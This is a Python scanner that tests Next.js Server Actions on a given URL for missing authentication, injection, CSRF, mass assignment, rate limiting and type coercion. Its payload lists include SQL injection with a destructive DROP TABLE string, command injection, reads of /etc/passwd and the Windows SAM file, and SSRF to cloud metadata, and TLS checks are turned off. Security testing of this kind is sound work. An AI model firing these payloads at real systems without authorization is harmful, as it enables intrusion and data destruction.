#!/usr/bin/env python3
"""
Server Actions Tester v1.0 - Next.js 14+ Server Actions Security Testing
Tests for vulnerabilities in Next.js Server Actions

What are Server Actions?
- New Next.js 14 feature for server-side mutations
- Defined with "use server" directive
- Called directly from client components
- Have unique action IDs

Vulnerabilities Tested:
1. Action ID Enumeration - Find hidden/admin actions
2. Authorization Bypass - Call actions without auth
3. Parameter Injection - SQL, NoSQL, command injection
4. CSRF on Actions - Missing CSRF protection
5. Mass Assignment - Unexpected parameter handling
6. Rate Limiting - Brute force actions
7. Type Coercion - Type confusion attacks
8. Prototype Pollution - via action parameters
9. Path Traversal - in file-handling actions
10. SSRF - in URL-processing actions

Author: Security Research Team
"""

import requests
import re
import json
import sys
import os
import hashlib
import time
from urllib.parse import urljoin, urlparse, quote
from collections import defaultdict
from datetime import datetime
from typing import Dict, List, Set, Optional, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
import urllib3
urllib3.disable_warnings()


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    END = "\033[0m"


@dataclass
class ServerAction:
    action_id: str
    name: Optional[str]
    file_path: Optional[str]
    bound_args: List[Any]
    parameters: List[str]


@dataclass
class ActionFinding:
    severity: str
    title: str
    action_id: str
    action_name: str
    vulnerability: str
    payload: str
    response: str
    impact: str


class ServerActionsTester:
    """
    Security tester for Next.js Server Actions
    """

    def __init__(self, target: str, auth_token: str = None, output_dir: str = ".",
                 verbose: bool = False):
        self.target = target.rstrip('/')
        self.auth_token = auth_token
        self.output_dir = output_dir
        self.verbose = verbose

        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/x-component',
            'Content-Type': 'text/plain;charset=UTF-8',
            'Next-Action': '',  # Will be set per request
        }
        if auth_token:
            self.session.headers['Authorization'] = auth_token
        self.session.verify = False

        # Discovered actions
        self.actions: List[ServerAction] = []
        self.findings: List[ActionFinding] = []

        # Common action names to look for
        self.common_action_names = [
            'create', 'update', 'delete', 'remove', 'add',
            'save', 'submit', 'process', 'handle', 'execute',
            'login', 'logout', 'register', 'authenticate',
            'upload', 'download', 'export', 'import',
            'send', 'notify', 'email', 'message',
            'admin', 'moderate', 'approve', 'reject',
            'payment', 'checkout', 'subscribe', 'cancel',
            'reset', 'change', 'modify', 'edit',
        ]

    def log(self, level: str, msg: str):
        colors = {
            'info': Colors.BLUE,
            'success': Colors.GREEN,
            'warning': Colors.YELLOW,
            'error': Colors.RED,
            'finding': Colors.PURPLE,
            'action': Colors.CYAN,
        }
        color = colors.get(level, '')
        print(f"{color}[{level.upper()}]{Colors.END} {msg}")

    def add_finding(self, severity: str, title: str, action_id: str, action_name: str,
                    vulnerability: str, payload: str, response: str, impact: str):
        finding = ActionFinding(
            severity=severity,
            title=title,
            action_id=action_id,
            action_name=action_name,
            vulnerability=vulnerability,
            payload=payload[:200],
            response=response[:300],
            impact=impact
        )
        self.findings.append(finding)
        self.log('finding', f"[{severity}] {title}")

    def run(self):
        """Run server actions security testing"""
        print(f"\n{Colors.BOLD}{'='*60}{Colors.END}")
        print(f"{Colors.PURPLE}   SERVER ACTIONS TESTER v1.0{Colors.END}")
        print(f"{Colors.BOLD}{'='*60}{Colors.END}")
        print(f"Target: {self.target}")
        print()

        # Phase 1: Discover Server Actions
        print(f"\n{Colors.CYAN}[PHASE 1] ACTION DISCOVERY{Colors.END}")
        self._discover_actions()

        # Phase 2: Analyze Actions
        print(f"\n{Colors.CYAN}[PHASE 2] ACTION ANALYSIS{Colors.END}")
        self._analyze_actions()

        # Phase 3: Authorization Testing
        print(f"\n{Colors.CYAN}[PHASE 3] AUTHORIZATION TESTING{Colors.END}")
        self._test_authorization()

        # Phase 4: Parameter Injection
        print(f"\n{Colors.CYAN}[PHASE 4] PARAMETER INJECTION{Colors.END}")
        self._test_parameter_injection()

        # Phase 5: CSRF Testing
        print(f"\n{Colors.CYAN}[PHASE 5] CSRF TESTING{Colors.END}")
        self._test_csrf()

        # Phase 6: Mass Assignment
        print(f"\n{Colors.CYAN}[PHASE 6] MASS ASSIGNMENT{Colors.END}")
        self._test_mass_assignment()

        # Phase 7: Rate Limiting
        print(f"\n{Colors.CYAN}[PHASE 7] RATE LIMITING{Colors.END}")
        self._test_rate_limiting()

        # Phase 8: Type Coercion
        print(f"\n{Colors.CYAN}[PHASE 8] TYPE COERCION{Colors.END}")
        self._test_type_coercion()

        # Generate Report
        self._generate_report()

    # ==================== ACTION DISCOVERY ====================

    def _discover_actions(self):
        """Discover server actions from the application"""
        self.log('info', 'Discovering server actions...')

        try:
            # Get main page and JS files
            resp = self.session.get(self.target, timeout=30)
            html = resp.text

            # Find action IDs in the page
            # Action IDs look like: $$ACTION_0, or encoded hashes
            action_patterns = [
                r'\$\$ACTION_(\d+)',
                r'"actionId"\s*:\s*"([^"]+)"',
                r'action["\']?\s*:\s*["\']([a-f0-9]{32,})["\']',
                r'next-action["\']?\s*:\s*["\']([^"\']+)["\']',
                r'formAction.*?([a-f0-9]{40})',
            ]

            action_ids = set()
            for pattern in action_patterns:
                for match in re.findall(pattern, html, re.IGNORECASE):
                    action_ids.add(match)

            # Find action IDs in JavaScript files
            js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+\.js)["\']', html)
            for js_url in js_urls[:20]:
                try:
                    full_url = urljoin(self.target, js_url)
                    js_resp = self.session.get(full_url, timeout=15)
                    for pattern in action_patterns:
                        for match in re.findall(pattern, js_resp.text, re.IGNORECASE):
                            action_ids.add(match)

                    # Find action function definitions
                    action_defs = re.findall(
                        r'(?:async\s+)?function\s+(\w*(?:' + '|'.join(self.common_action_names) + r')\w*)',
                        js_resp.text, re.IGNORECASE
                    )
                    for action_name in action_defs:
                        # Generate potential action ID
                        potential_id = hashlib.sha1(action_name.encode()).hexdigest()[:40]
                        action_ids.add(potential_id)

                except:
                    pass

            # Create action objects
            for action_id in action_ids:
                self.actions.append(ServerAction(
                    action_id=action_id,
                    name=None,
                    file_path=None,
                    bound_args=[],
                    parameters=[]
                ))

            self.log('success', f'Discovered {len(self.actions)} potential server actions')

            # Try to validate and get more info about each action
            for action in self.actions[:20]:
                self._probe_action(action)

        except Exception as e:
            self.log('error', f'Discovery failed: {e}')

    def _probe_action(self, action: ServerAction):
        """Probe an action to understand its structure"""
        try:
            headers = {
                'Next-Action': action.action_id,
                'Content-Type': 'text/plain;charset=UTF-8',
            }

            # Send empty request to see error response
            resp = self.session.post(self.target, headers=headers, data='[]', timeout=10)

            if resp.status_code == 200:
                self.log('action', f'Valid action: {action.action_id[:20]}...')

                # Try to extract parameter info from error
                if 'expected' in resp.text.lower() or 'argument' in resp.text.lower():
                    # Parse expected parameters
                    param_match = re.search(r'expected\s+(\d+)\s+argument', resp.text, re.IGNORECASE)
                    if param_match:
                        action.parameters = [f'param{i}' for i in range(int(param_match.group(1)))]

        except:
            pass

    # ==================== ACTION ANALYSIS ====================

    def _analyze_actions(self):
        """Analyze discovered actions for security issues"""
        self.log('info', 'Analyzing action configurations...')

        for action in self.actions:
            # Check if action accepts any input
            try:
                headers = {'Next-Action': action.action_id}

                # Test with various payload sizes
                payloads = [
                    '[]',
                    '["test"]',
                    '["test", "value"]',
                    '[{"key": "value"}]',
                ]

                for payload in payloads:
                    resp = self.session.post(self.target, headers=headers, data=payload, timeout=10)
                    if resp.status_code == 200 and len(resp.text) > 10:
                        if 'error' not in resp.text.lower():
                            self.log('info', f'Action {action.action_id[:20]}... accepts: {payload[:50]}')
                            break

            except:
                pass

    # ==================== AUTHORIZATION TESTING ====================

    def _test_authorization(self):
        """Test if actions can be called without authentication"""
        self.log('info', 'Testing authorization requirements...')

        # Create unauthenticated session
        unauth_session = requests.Session()
        unauth_session.headers = {
            'User-Agent': 'Mozilla/5.0',
            'Accept': 'text/x-component',
            'Content-Type': 'text/plain;charset=UTF-8',
        }
        unauth_session.verify = False

        for action in self.actions[:10]:
            try:
                headers = {'Next-Action': action.action_id}

                # Test without auth
                resp_unauth = unauth_session.post(self.target, headers=headers, data='[]', timeout=10)

                # Test with auth (if we have it)
                if self.auth_token:
                    self.session.headers['Next-Action'] = action.action_id
                    resp_auth = self.session.post(self.target, data='[]', timeout=10)

                    # Compare responses
                    if resp_unauth.status_code == 200 and resp_auth.status_code == 200:
                        if resp_unauth.text == resp_auth.text:
                            self.add_finding(
                                severity='HIGH',
                                title='Server Action Missing Authentication',
                                action_id=action.action_id,
                                action_name=action.name or 'unknown',
                                vulnerability='missing_auth',
                                payload='[]',
                                response=resp_unauth.text,
                                impact='Action can be called without authentication'
                            )
                else:
                    if resp_unauth.status_code == 200 and 'error' not in resp_unauth.text.lower():
                        self.log('warning', f'Action callable without auth: {action.action_id[:20]}...')

            except:
                pass

    # ==================== PARAMETER INJECTION ====================

    def _test_parameter_injection(self):
        """Test for injection vulnerabilities in action parameters"""
        self.log('info', 'Testing parameter injection...')

        injection_payloads = {
            'sqli': [
                "' OR '1'='1",
                "'; DROP TABLE users--",
                "1' AND SLEEP(5)--",
            ],
            'nosql': [
                '{"$gt": ""}',
                '{"$ne": null}',
                '{"$where": "sleep(5000)"}',
            ],
            'command': [
                '; id',
                '| id',
                '`id`',
                '$(id)',
            ],
            'ssti': [
                '{{7*7}}',
                '${7*7}',
                '<%= 7*7 %>',
            ],
            'path': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
            ],
            'ssrf': [
                'http://127.0.0.1',
                'http://169.254.169.254/latest/meta-data/',
                'file:///etc/passwd',
            ],
        }

        for action in self.actions[:10]:
            for vuln_type, payloads in injection_payloads.items():
                for payload in payloads:
                    try:
                        headers = {'Next-Action': action.action_id}
                        data = json.dumps([payload])

                        resp = self.session.post(self.target, headers=headers, data=data, timeout=15)

                        # Check for injection success indicators
                        if vuln_type == 'sqli':
                            if any(x in resp.text.lower() for x in ['sql', 'mysql', 'syntax', 'query']):
                                self.add_finding(
                                    severity='CRITICAL',
                                    title='SQL Injection in Server Action',
                                    action_id=action.action_id,
                                    action_name=action.name or 'unknown',
                                    vulnerability='sqli',
                                    payload=payload,
                                    response=resp.text,
                                    impact='Full database access'
                                )

                        elif vuln_type == 'command':
                            if 'uid=' in resp.text or 'root:' in resp.text:
                                self.add_finding(
                                    severity='CRITICAL',
                                    title='Command Injection in Server Action',
                                    action_id=action.action_id,
                                    action_name=action.name or 'unknown',
                                    vulnerability='command_injection',
                                    payload=payload,
                                    response=resp.text,
                                    impact='Remote code execution'
                                )

                        elif vuln_type == 'ssti':
                            if '49' in resp.text:  # 7*7 = 49
                                self.add_finding(
                                    severity='HIGH',
                                    title='SSTI in Server Action',
                                    action_id=action.action_id,
                                    action_name=action.name or 'unknown',
                                    vulnerability='ssti',
                                    payload=payload,
                                    response=resp.text,
                                    impact='Server-side template injection'
                                )

                        elif vuln_type == 'path':
                            if 'root:' in resp.text or 'passwd' in resp.text:
                                self.add_finding(
                                    severity='HIGH',
                                    title='Path Traversal in Server Action',
                                    action_id=action.action_id,
                                    action_name=action.name or 'unknown',
                                    vulnerability='path_traversal',
                                    payload=payload,
                                    response=resp.text,
                                    impact='Arbitrary file read'
                                )

                    except:
                        pass

    # ==================== CSRF TESTING ====================

    def _test_csrf(self):
        """Test CSRF protection on server actions"""
        self.log('info', 'Testing CSRF protection...')

        for action in self.actions[:5]:
            try:
                headers = {
                    'Next-Action': action.action_id,
                    'Origin': 'https://evil.com',
                    'Referer': 'https://evil.com/attack.html',
                }

                resp = self.session.post(self.target, headers=headers, data='["test"]', timeout=10)

                if resp.status_code == 200 and 'error' not in resp.text.lower():
                    self.add_finding(
                        severity='MEDIUM',
                        title='Server Action Accepts Cross-Origin Request',
                        action_id=action.action_id,
                        action_name=action.name or 'unknown',
                        vulnerability='csrf',
                        payload='Origin: evil.com',
                        response=resp.text,
                        impact='CSRF attacks possible'
                    )

            except:
                pass

    # ==================== MASS ASSIGNMENT ====================

    def _test_mass_assignment(self):
        """Test mass assignment vulnerabilities"""
        self.log('info', 'Testing mass assignment...')

        dangerous_fields = [
            'isAdmin', 'admin', 'role', 'roles', 'permission', 'permissions',
            'is_admin', 'is_superuser', 'superuser', 'status', 'verified',
            'email_verified', 'active', 'approved', 'balance', 'credits',
            'user_id', 'userId', 'id', '__proto__', 'constructor',
        ]

        for action in self.actions[:5]:
            for field in dangerous_fields:
                try:
                    headers = {'Next-Action': action.action_id}
                    payload = json.dumps([{field: True, 'name': 'test'}])

                    resp = self.session.post(self.target, headers=headers, data=payload, timeout=10)

                    if resp.status_code == 200 and 'error' not in resp.text.lower():
                        # Check if field was processed
                        if field.lower() in resp.text.lower():
                            self.add_finding(
                                severity='HIGH',
                                title=f'Mass Assignment: {field}',
                                action_id=action.action_id,
                                action_name=action.name or 'unknown',
                                vulnerability='mass_assignment',
                                payload=f'{field}: true',
                                response=resp.text,
                                impact='Privilege escalation via mass assignment'
                            )
                            break

                except:
                    pass

    # ==================== RATE LIMITING ====================

    def _test_rate_limiting(self):
        """Test rate limiting on server actions"""
        self.log('info', 'Testing rate limiting...')

        for action in self.actions[:3]:
            try:
                headers = {'Next-Action': action.action_id}
                statuses = []

                for i in range(20):
                    resp = self.session.post(self.target, headers=headers, data='[]', timeout=5)
                    statuses.append(resp.status_code)

                # Check if we got rate limited
                if 429 not in statuses:
                    self.log('warning', f'No rate limiting on action: {action.action_id[:20]}...')

                    # Check if all requests succeeded
                    if all(s == 200 for s in statuses):
                        self.add_finding(
                            severity='LOW',
                            title='Missing Rate Limiting on Server Action',
                            action_id=action.action_id,
                            action_name=action.name or 'unknown',
                            vulnerability='no_rate_limit',
                            payload='20 rapid requests',
                            response=f'All returned 200',
                            impact='Brute force attacks possible'
                        )

            except:
                pass

    # ==================== TYPE COERCION ====================

    def _test_type_coercion(self):
        """Test type coercion vulnerabilities"""
        self.log('info', 'Testing type coercion...')

        type_payloads = [
            ('array_bypass', ['admin']),
            ('object_bypass', {'admin': True}),
            ('number_bypass', 0),
            ('bool_bypass', True),
            ('null_bypass', None),
            ('nested_array', [['admin']]),
            ('proto_pollution', {'__proto__': {'isAdmin': True}}),
            ('constructor', {'constructor': {'prototype': {'isAdmin': True}}}),
        ]

        for action in self.actions[:5]:
            for name, payload in type_payloads:
                try:
                    headers = {'Next-Action': action.action_id}
                    data = json.dumps([payload])

                    resp = self.session.post(self.target, headers=headers, data=data, timeout=10)

                    if resp.status_code == 200:
                        if 'admin' in resp.text.lower() or 'success' in resp.text.lower():
                            self.log('warning', f'Type coercion may work: {name} on {action.action_id[:20]}...')

                except:
                    pass

    # ==================== REPORT GENERATION ====================

    def _generate_report(self):
        """Generate testing report"""
        print(f"\n{Colors.BOLD}{'='*60}{Colors.END}")
        print(f"{Colors.PURPLE}   SERVER ACTIONS TESTING RESULTS{Colors.END}")
        print(f"{Colors.BOLD}{'='*60}{Colors.END}")

        print(f"\n{Colors.CYAN}Summary:{Colors.END}")
        print(f"  Actions Discovered: {len(self.actions)}")
        print(f"  Vulnerabilities Found: {len(self.findings)}")

        if self.findings:
            by_severity = defaultdict(list)
            for f in self.findings:
                by_severity[f.severity].append(f)

            print(f"\n{Colors.CYAN}By Severity:{Colors.END}")
            for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
                if by_severity[sev]:
                    color = {'CRITICAL': Colors.RED + Colors.BOLD, 'HIGH': Colors.RED,
                             'MEDIUM': Colors.YELLOW, 'LOW': Colors.CYAN}.get(sev, '')
                    print(f"  {color}{sev}: {len(by_severity[sev])}{Colors.END}")

            print(f"\n{Colors.CYAN}Detailed Findings:{Colors.END}")
            for finding in self.findings:
                print(f"\n  {Colors.YELLOW}[{finding.severity}] {finding.title}{Colors.END}")
                print(f"    Action ID: {finding.action_id[:30]}...")
                print(f"    Vulnerability: {finding.vulnerability}")
                print(f"    Payload: {finding.payload}")
                print(f"    Impact: {finding.impact}")

        # Save report
        report = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'actions_discovered': len(self.actions),
            'actions': [
                {
                    'id': a.action_id,
                    'name': a.name,
                    'parameters': a.parameters,
                }
                for a in self.actions
            ],
            'findings': [
                {
                    'severity': f.severity,
                    'title': f.title,
                    'action_id': f.action_id,
                    'action_name': f.action_name,
                    'vulnerability': f.vulnerability,
                    'payload': f.payload,
                    'response': f.response,
                    'impact': f.impact,
                }
                for f in self.findings
            ]
        }

        report_dir = os.path.join(self.output_dir, 'server_actions_results')
        os.makedirs(report_dir, exist_ok=True)

        report_file = os.path.join(report_dir, 'server_actions_report.json')
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"\n{Colors.GREEN}Report saved: {report_file}{Colors.END}")


def main():
    if len(sys.argv) < 2:
        print("Usage: python server_actions_tester.py <target_url> [options]")
        print("\nOptions:")
        print("  --auth <token>    Authentication token")
        print("  -v, --verbose     Verbose output")
        print("\nExample:")
        print("  python server_actions_tester.py https://example.com")
        print("  python server_actions_tester.py https://example.com --auth 'Bearer token'")
        sys.exit(1)

    target = sys.argv[1]
    auth_token = None
    verbose = False

    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '--auth' and i + 1 < len(sys.argv):
            auth_token = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] in ['-v', '--verbose']:
            verbose = True
            i += 1
        else:
            i += 1

    tester = ServerActionsTester(target, auth_token=auth_token, verbose=verbose)
    tester.run()


if __name__ == "__main__":
    main()
